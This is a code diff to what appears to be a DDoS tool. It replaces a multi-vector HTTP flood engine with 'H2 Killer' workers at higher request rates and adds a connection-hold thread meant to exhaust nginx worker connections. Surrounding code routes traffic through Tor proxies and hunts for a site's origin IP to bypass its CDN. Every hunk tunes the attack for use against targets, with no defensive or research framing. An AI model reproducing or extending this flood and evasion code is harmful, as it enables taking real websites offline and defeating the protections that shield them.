@@ -1051,10 +1051,8 @@ async def run_http_flood_multi(targets: List[str], cfg: dict):
     if proxy_urls:
         print(f"  {c('g','[+]')} Tor proxies: {len(proxy_urls)}")
     _rich_sep()
-    from core.monitor.auto_dashboard import AutoDashboard
-    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    from core.attack.engines.h2_killer_engine import run_killer_worker
     import threading as _th
-    import atexit
 
     import queue as _queue
     all_tasks = []
@@ -1067,28 +1065,26 @@ async def run_http_flood_multi(targets: List[str], cfg: dict):
         stop_evts = []
         results = []
         live_q = _queue.Queue()
-        modes = [
-            ("mv_connhold", "connhold", 0.10),
-            ("mv_flood",    "flood",    0.30),
-            ("mv_post",     "post",     0.20),
+        killers = [
+            ("killer1", 0.30, 4),
+            ("killer2", 0.25, 3),
+            ("killer3", 0.20, 2),
+            ("killer4", 0.15, 2),
+            ("killer5", 0.10, 1),
         ]
-        for name, mode, share in modes:
-            wrps = max(50, int(rps * share))
+        for name, share, conns in killers:
+            wrps = max(1000, int(rps * share))
             evt = _th.Event()
             res = {}
             th = _th.Thread(
-                target=run_multi_vector_engine,
+                target=run_killer_worker,
                 name=f"multi_{host}_{name}",
                 kwargs=dict(
-                    target_url=target,
-                    duration_seconds=float(duration),
-                    target_rps=wrps,
-                    worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
-                    stats_queue=live_q,
-                    stop_event=evt,
-                    proxy_urls=proxy_urls if proxy_urls else None,
+                    target_url=target, rps=wrps,
+                    duration=float(duration), worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
+                    stats_queue=live_q, stop_event=evt,
+                    host_header=host, connections=conns,
                     result_dict=res,
-                    vector_mode=mode,
                 ),
                 daemon=True,
             )
@@ -1632,83 +1628,97 @@ async def run_http_flood(target: str, cfg: dict):
 
     # Spin up the AutoDashboard for live per-vector RPS rendering.
     from core.monitor.auto_dashboard import AutoDashboard
-    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    from core.attack.engines.h2_killer_engine import run_killer_worker
+    from core.attack.engines.h2_hold_engine import run_hold_worker
     import threading as _th
+    import queue as _queue
 
     dash = AutoDashboard(
-        target=effective_url,
-        duration=duration,
-        target_rps=rps,
-        stalled_ms=8000,
-        refresh_ms=50,
+        target=effective_url, duration=duration,
+        target_rps=rps, stalled_ms=8000, refresh_ms=50,
     )
     vectors = [
-        ("mv_connhold",   "Connection Hold",   0.10, "connhold",   1000, 1),
-        ("mv_flood",      "GET Flood",         0.30, "flood",      1500, 30),
-        ("mv_post",       "POST Bomb",         0.20, "post",       600,  10),
-        ("mv_cdnpoison",  "Cache Poison",      0.20, "cdnpoison",  500,  5),
-        ("mv_resexh",     "Resource Exhaust",  0.10, "resexh",     400,  3),
-        ("mv_h2reset",    "HTTP/2 Reset",      0.10, "h2reset",    100,  1),
+        ("killer_1", "H2 Killer", 0.25, 4),
+        ("killer_2", "H2 Killer", 0.25, 4),
+        ("killer_3", "H2 Killer", 0.20, 3),
+        ("killer_4", "H2 Killer", 0.20, 3),
+        ("killer_5", "H2 Killer", 0.10, 2),
     ]
-    for name, label, _share, _mode, _pool, _pipe in vectors:
+    for name, label, _share, _conns in vectors:
         dash.register_vector(name, label)
 
-    dash.set_engine_label("multi_vector + raw_socket")
-    dash.set_global_note(f"proxies={len(proxy_urls)} origin_ip={opts.get('origin_ip','-')}")
+    dash.set_engine_label("H2+KILLER v2")
+    dash.set_global_note(f"origin={opts.get('origin_ip','-')}")
     dash.start()
 
-    # Spawn one worker per vector. We do NOT use multiprocess.spawn (broken on Windows
-    # because main.py re-imports argparse). Threads with isolated asyncio loops.
     handles = []
-    for name, label, share, mode, pool_size, pipe in vectors:
-        worker_target_rps = max(50, int(rps * share))
+    for name, label, share, conns in vectors:
+        wrps = max(1000, int(rps * share))
         stop_evt = _th.Event()
         result: dict = {}
         proxy_q = dash.get_stats_queue()
 
-        # Wrap queue to inject vector_name on each push
         class _Proxy:
-            def __init__(self, vname):
-                self.vname = vname
+            def __init__(self, vn):
+                self.vn = vn
             def put_nowait(self, item):
                 if isinstance(item, dict):
-                    item["vector_name"] = self.vname
+                    item["vector_name"] = self.vn
                 proxy_q.put_nowait(item)
             def get_nowait(self):
                 return proxy_q.get_nowait()
 
         th = _th.Thread(
-            target=run_multi_vector_engine,
-            name=f"http_flood_{name}",
+            target=run_killer_worker,
+            name=f"flood_{name}",
             kwargs=dict(
-                target_url=effective_url,
-                duration_seconds=float(duration),
-                target_rps=worker_target_rps,
-                worker_id=abs(hash(name)) & 0xFFFF,
-                stats_queue=_Proxy(name),
-                stop_event=stop_evt,
-                proxy_urls=proxy_urls if proxy_urls else None,
+                target_url=effective_url, rps=wrps,
+                duration=float(duration), worker_id=abs(hash(name)) & 0xFFFF,
+                stats_queue=_Proxy(name), stop_event=stop_evt,
+                host_header=host_header, connections=conns,
                 result_dict=result,
-                vector_mode=mode,
-                host_header=host_header,
             ),
             daemon=True,
         )
         th.start()
         handles.append((th, stop_evt, result, name))
 
-    # Drive dashboard while vectors run
+    # Also start connection-hold engine to exhaust nginx worker_connections
+    hold_stop = _th.Event()
+    hold_result = {}
+    hold_q = _queue.Queue()
+    class _HoldProxy:
+        def put_nowait(self, item):
+            if isinstance(item, dict):
+                item["vector_name"] = "hold"
+            hold_q.put_nowait(item)
+        def get_nowait(self):
+            return hold_q.get_nowait()
+    # Adjust connection target based on duration (hold more for longer attacks)
+    hold_conn_target = min(1000, max(200, duration * 2))
+    hold_th = _th.Thread(
+        target=run_hold_worker,
+        name="flood_hold",
+        kwargs=dict(
+            target_url=effective_url, duration=float(duration),
+            worker_id=9999, stats_queue=_HoldProxy(), stop_event=hold_stop,
+            host_header=host_header, connections=hold_conn_target,
+        ),
+        daemon=True,
+    )
+    hold_th.start()
+    handles.append((hold_th, hold_stop, hold_result, "hold"))
+    print(f"  {c('g','[+]')} H2 connection hold: {hold_conn_target} targets")
+
     try:
         end_at = time.time() + duration
         while time.time() < end_at:
             await asyncio.sleep(0.5)
-            # Stop early if all threads died
             if not any(h[0].is_alive() for h in handles):
                 break
     except KeyboardInterrupt:
         print(f"\n {c('y','[!]')} Cancelled by user.")
 
-    # Signal stop and join
     for _th_obj, evt, _r, _n in handles:
         evt.set()
     for th_obj, _e, _r, _n in handles:
@@ -1717,7 +1727,6 @@ async def run_http_flood(target: str, cfg: dict):
         except Exception:
             pass
 
-    # Aggregate results
     agg = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
     for _th_obj, _e, r, _n in handles:
         agg["total_requests"] += int(r.get("sent", 0))
@@ -1727,7 +1736,6 @@ async def run_http_flood(target: str, cfg: dict):
 
     await asyncio.sleep(0.5)
     dash.stop()
-
     print_attack_summary(target, duration, agg)
 
 
@@ -2519,17 +2527,17 @@ async def run_mixed_attack(target: str, cfg: dict):
         except Exception as e:
             print(f" {c('y','[!]')} proxy setup: {e}")
 
-    # ----- Origin discovery -----
-    origin_ip = ""
+    # ----- Origin discovery (keep CDN detection result from above if found) -----
     parsed = urlparse(target)
     hostname = parsed.hostname or ""
-    from core.recon.origin.origin_store import load_hunt, get_best_origin
-    saved = load_hunt(target)
-    if saved and (saved.get("verified_origins") or saved.get("candidates")):
-        best = get_best_origin(target)
-        if best:
-            origin_ip = best
-            print(f" {c('g','[+]')} Found saved origin: {origin_ip}")
+    if not origin_ip:
+        from core.recon.origin.origin_store import load_hunt, get_best_origin
+        saved = load_hunt(target)
+        if saved and (saved.get("verified_origins") or saved.get("candidates")):
+            best = get_best_origin(target)
+            if best:
+                origin_ip = best
+                print(f" {c('g','[+]')} Found saved origin: {origin_ip}")
     if not origin_ip:
         if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
             from core.recon.origin.origin_hunter import OriginHunter
@@ -2560,41 +2568,38 @@ async def run_mixed_attack(target: str, cfg: dict):
     print(f"\n {c('c','[*]')} MIXED v2 | {target} | {duration}s | {rps} RPS | proxies={len(proxy_urls)}")
     _rich_sep()
 
-    # ----- Launch live AutoDashboard + multi_vector_engine workers -----
+    # ----- Launch live AutoDashboard + H2 Killer workers -----
     from core.monitor.auto_dashboard import AutoDashboard
-    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    from core.attack.engines.h2_killer_engine import run_killer_worker
+    from core.attack.engines.h2_hold_engine import run_hold_worker
     import threading as _th
+    import queue as _queue
 
     dash = AutoDashboard(
-        target=effective_url,
-        duration=duration,
-        target_rps=rps,
-        stalled_ms=8000,
-        refresh_ms=50,
+        target=effective_url, duration=duration,
+        target_rps=rps, stalled_ms=8000, refresh_ms=50,
     )
 
     vectors = [
-        ("mv_connhold",   "Connection Hold",   0.08, "connhold",   2000, 1),
-        ("mv_flood",      "GET Flood",         0.22, "flood",      2000, 30),
-        ("mv_post",       "POST Bomb",         0.15, "post",       800,  10),
-        ("mv_slow",       "Slow Rate",         0.05, "slow",       500,  1),
-        ("mv_h2reset",    "HTTP/2 Reset",      0.18, "h2reset",    200,  1),
-        ("mv_drip",       "Slow Drip",         0.06, "drip",       500,  1),
-        ("mv_cdnpoison",  "Cache Poison",      0.10, "cdnpoison",  800,  5),
-        ("mv_resexh",     "Resource Exhaust",  0.08, "resexh",     600,  3),
-        ("mv_sslreneg",   "SSL Reneg",         0.04, "sslreneg",   200,  1),
-        ("mv_rangeamp",   "Range Amp",         0.04, "rangeamp",   400,  1),
+        ("killer_1", "H2 Killer", 0.20, 4),
+        ("killer_2", "H2 Killer", 0.20, 4),
+        ("killer_3", "H2 Killer", 0.15, 3),
+        ("killer_4", "H2 Killer", 0.15, 3),
+        ("killer_5", "H2 Killer", 0.10, 2),
+        ("killer_6", "H2 Killer", 0.10, 2),
+        ("killer_7", "H2 Killer", 0.07, 2),
+        ("killer_8", "H2 Killer", 0.03, 1),
     ]
-    for name, label, _share, _mode, _pool, _pipe in vectors:
+    for name, label, _share, _conns in vectors:
         dash.register_vector(name, label)
 
-    dash.set_engine_label(f"mixed_v2 proxies={len(proxy_urls)} origin={origin_ip or '-'}")
-    dash.set_global_note("MIXED ATTACK V2 — 10 vectors")
+    dash.set_engine_label(f"mixed_v2 origin={origin_ip or '-'}")
+    dash.set_global_note("MIXED ATTACK V2 — H2+KILLER")
     dash.start()
 
     handles = []
-    for name, label, share, mode, pool_size, pipe in vectors:
-        worker_target_rps = max(50, int(rps * share))
+    for name, label, share, conns in vectors:
+        wrps = max(1000, int(rps * share))
         stop_evt = _th.Event()
         result: dict = {}
         proxy_q = dash.get_stats_queue()
@@ -2610,24 +2615,45 @@ async def run_mixed_attack(target: str, cfg: dict):
                 return proxy_q.get_nowait()
 
         th = _th.Thread(
-            target=run_multi_vector_engine,
+            target=run_killer_worker,
             name=f"mixed_{name}",
             kwargs=dict(
-                target_url=effective_url,
-                duration_seconds=float(duration),
-                target_rps=worker_target_rps,
-                worker_id=abs(hash(name)) & 0xFFFF,
-                stats_queue=_Proxy(name),
-                stop_event=stop_evt,
-                proxy_urls=proxy_urls if proxy_urls else None,
+                target_url=effective_url, rps=wrps,
+                duration=float(duration), worker_id=abs(hash(name)) & 0xFFFF,
+                stats_queue=_Proxy(name), stop_event=stop_evt,
+                host_header=host_header, connections=conns,
                 result_dict=result,
-                vector_mode=mode,
-                host_header=host_header,
             ),
             daemon=True,
         )
         th.start()
         handles.append((th, stop_evt, result, name))
+
+    # Also start connection-hold engine
+    hold_stop = _th.Event()
+    hold_result = {}
+    hold_q = _queue.Queue()
+    class _HoldProxy:
+        def put_nowait(self, item):
+            if isinstance(item, dict):
+                item["vector_name"] = "hold"
+            hold_q.put_nowait(item)
+        def get_nowait(self):
+            return hold_q.get_nowait()
+    hold_conn_target = min(1000, max(200, duration * 2))
+    hold_th = _th.Thread(
+        target=run_hold_worker,
+        name="mixed_hold",
+        kwargs=dict(
+            target_url=effective_url, duration=float(duration),
+            worker_id=9999, stats_queue=_HoldProxy(), stop_event=hold_stop,
+            host_header=host_header, connections=hold_conn_target,
+        ),
+        daemon=True,
+    )
+    hold_th.start()
+    handles.append((hold_th, hold_stop, hold_result, "hold"))
+    print(f"  {c('g','[+]')} H2 connection hold: {hold_conn_target} targets")
 
     try:
         end_at = time.time() + duration
